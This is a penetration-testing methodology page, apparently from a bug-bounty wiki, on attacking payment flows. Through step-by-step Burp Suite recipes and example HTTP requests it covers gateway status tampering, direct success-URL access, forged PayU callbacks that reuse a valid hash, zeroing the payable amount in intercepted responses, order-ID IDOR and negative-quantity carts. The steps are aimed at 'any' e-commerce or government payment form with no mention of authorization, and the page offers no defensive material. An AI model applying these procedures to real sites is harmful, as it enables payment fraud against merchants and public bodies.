# Payment Functionality

## Check List

## Methodology

### Black Box

#### Payment Gateway Bypass

{% stepper %}
{% step %}
Add items to the cart and proceed to checkout to initiate a payment via the third-party gateway, capturing the redirect URL and parameters with Burp Suite
{% endstep %}

{% step %}
Complete a legitimate low-cost purchase to obtain a valid payment\_id and observe the success redirect parameters (`status=Succeed`, `payment_id=abc123`)
{% endstep %}

{% step %}
Start a new order, proceed to payment, and cancel it at the gateway to trigger a failure redirect with parameters (`status=Failed`, `payment_id=xyz789`)
{% endstep %}

{% step %}
Intercept the failure redirect response in Burp Suite and modify the parameters to fake success: change `status=Failed` to `status=Succeed` and replace `payment_id=xyz789` with the valid `payment_id=abc123` from the prior transaction
{% endstep %}

{% step %}
Check the target website for order confirmation or invoice; if the order is marked as paid without actual payment, it confirms the bypass vulnerability
{% endstep %}
{% endstepper %}

***

#### **Payment Bypass**

{% stepper %}
{% step %}
Go to any e-commerce checkout flow
{% endstep %}

{% step %}
Add any item to cart and proceed to checkout
{% endstep %}

{% step %}
Choose any payment method
{% endstep %}

{% step %}
Intercept the final redirect or POST request with Burp Suite
{% endstep %}

{% step %}
Do NOT complete the payment, just note the success, URL Extract the success URL Like

```http
https://target.com/success?order_id=12345&status=paid
```
{% endstep %}

{% step %}
Manually visit the success URL directly then Paste it in a new tab

```http
https://xyz.com/success?order_id=12345
```
{% endstep %}

{% step %}
Check your account, Orders

If the order appears as Confirmed, Paid, Shipped, Payment Bypass CONFIRMED
{% endstep %}
{% endstepper %}

***

#### Payment Callback Forgery

{% stepper %}
{% step %}
Go to any payment form on a government or enterprise site
{% endstep %}

{% step %}
Enter a small test amount (`5 INR / $1`) and click `“Pay Now”`
{% endstep %}

{% step %}
Let the site redirect you to the payment gateway (PayU,)
{% endstep %}

{% step %}
Cancel the payment, Click Back or Cancel, Confirm cancellation

This triggers a `POST` to `/PayFail.aspx` (or `/fail`, `/cancel`, `/error`)
{% endstep %}

{% step %}
Intercept the FAIL request with Burp Suite Example

```http
POST /PayFail.aspx HTTP/1.1

status=failure&unmappedstatus=userCancelled&net_amount_debit=0.00&error=E1605&error_Message=Transaction+failed...
```
{% endstep %}

{% step %}
Make a REAL payment (once) to capture success response, Pay 5 INR → Let it succeed

Capture the SUCCESS callback `POST` to `/PayCallBack.aspx` `(or /success, /verify, /return)`

Example success body

```
status=success
unmappedstatus=captured
net_amount_debit=5.06
additionalCharges=0.06
mode=UPI
field9=Success%7CCompleted+Using+Callback
error=E000
error_Message=No+Error
```
{% endstep %}

{% step %}
Change path `POST /PayCallBack.aspx`
{% endstep %}

{% step %}
Replace entire body with the successful payment data
{% endstep %}

{% step %}
Keep only these original values (from your failed attempt) like

* mihpayid
* txnid
* addedon
* hash (critical — must match PayU checksum)
{% endstep %}

{% step %}
Override the rest with success values

```
status=success
unmappedstatus=captured
net_amount_debit=5.06
additionalCharges=0.06
mode=UPI
field9=Success%7CCompleted+Using+Callback
error=E000
error_Message=No+Error
```
{% endstep %}

{% step %}
Final bypass request (example) like

```http
POST /PayCallBack.aspx HTTP/1.1
Host: www.xyz.gov.in
Content-Type: application/x-www-form-urlencoded

mihpayid=17797357055&mode=UPI&status=success&unmappedstatus=captured&key=dTA6xR&txnid=17917&amount=5.00&discount=0.00&additionalCharges=0.06&net_amount_debit=5.06&addedon=2023-07-24+11%3A13%3A45&productinfo=Type+Rent&firstname=Test&email=test@gmail.com&phone=1234567890&hash=56c3763f3b737116730e420b2004a4b699f485e98ccc3e887aa63afee3c49ce3f9780c375fe08bf6f36df76497463f1ca47c7fa4587541b88a1b99cc1823515c&field1=UPI&field9=Success%7CCompleted+Using+Callback&payment_source=payu&PG_TYPE=UPI-PG&bank_ref_num=FAKE123&bankcode=UPI&error=E000&error_Message=No+Error
```
{% endstep %}

{% step %}
Send the request
{% endstep %}
{% endstepper %}

***

#### Response Manipulation

{% stepper %}
{% step %}
Go to any mobile app (Android/iOS) with a reward points system, wallet, cart checkout
{% endstep %}

{% step %}
Use Burp Suite, rooted device or emulator
{% endstep %}

{% step %}
Set up proxy and capture all traffic
{% endstep %}

{% step %}
Add items to cart, Proceed to checkout, Apply reward points to reduce price

Look for a request like

```http
POST /cart/apply-discount HTTP/1.1
...
points=100&cart_id=123456
```
{% endstep %}

{% step %}
Intercept the response then Find JSON with updated total

```json
{
  "final_amount": 250,
  "discount": 100,
  "payable": 150
}
```
{% endstep %}

{% step %}
Manipulate response in Burp Repeater and change

```json
"payable": 0
```

or

```json
"final_amount": 0
```
{% endstep %}

{% step %}
Forward the modified response to the app
{% endstep %}

{% step %}
In the app, click `“Place Order”` , If order confirms with `₹0` payment, Payment Bypass via Response Manipulation CONFIRMED
{% endstep %}
{% endstepper %}

***

#### IDOR in Payment

{% stepper %}
{% step %}
Log in to the target site and create two accounts, one account A and another account B
{% endstep %}

{% step %}
Log in with Account A
{% endstep %}

{% step %}
Add an item worth $100 to your cart
{% endstep %}

{% step %}
After going to the payment page, click on Place Order and then use intercept in Burp Suite to hold the request and check it like the following request

```http
POST /orderplaced HTTP/2
Host: api.redacted.in
Content-Type: application/x-www-form-urlencoded

order_id=1234567&payment_type=UPI&vpa=xxx@upi&merchant=xxx&authentication=GET&orderplaced_type=UPI
```
{% endstep %}

{% step %}
If you see a parameter like `order_id` that returns a number, store its value in And then drop the request
{% endstep %}

{% step %}
Then log in using the second account (Account B) you created and add an item worth $50 to your cart
{% endstep %}

{% step %}
Then, after going to the payment page and turning on the Intercept option in Burp Suite, click on the Place Order option and intercept the request

```http
POST /orderplaced HTTP/2
Host: api.redacted.in

order_id=1234568&payment_type=UPI&vpa=xxx@upi&merchant=xxx&authentication=GET&orderplaced_type=UPI
```
{% endstep %}

{% step %}
We replace the value of the order\_id parameter that we saved and copied in the order registration of account A with the value of the order\_id parameter of account B as follows

```http
POST /orderplaced HTTP/2
Host: api.redacted.in

order_id=1234567&payment_type=UPI&vpa=xxx@upi&merchant=xxx&authentication=GET&orderplaced_type=UPI
```
{% endstep %}

{% step %}
Check if you have to pay $100 instead of $50, it means that a vulnerability has occurred and we have access to the victim's order
{% endstep %}
{% endstepper %}

***

#### Negative Quantity Manipulation

{% stepper %}
{% step %}
Go to any e-commerce cart or checkout page
{% endstep %}

{% step %}
Then use burp suite to intercept the requests and examine the request inside the add to cart request
{% endstep %}

{% step %}
Inside the intercepted request, convert the parameter specifying the product price to - as shown below

```http
POST /cart/update HTTP/1.1
...
item_id=123&quantity=-1000
```

or in JSON

```json
{"product_id": 456, "qty": -1000}
```
{% endstep %}

{% step %}
Because we cannot pay -1000, we must add another product to the shopping cart at the same price so that the total of the shopping cart becomes 0

```
(-130) + 130 = 0
```
{% endstep %}

{% step %}
Then check the shopping cart and if it has been converted to zero, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
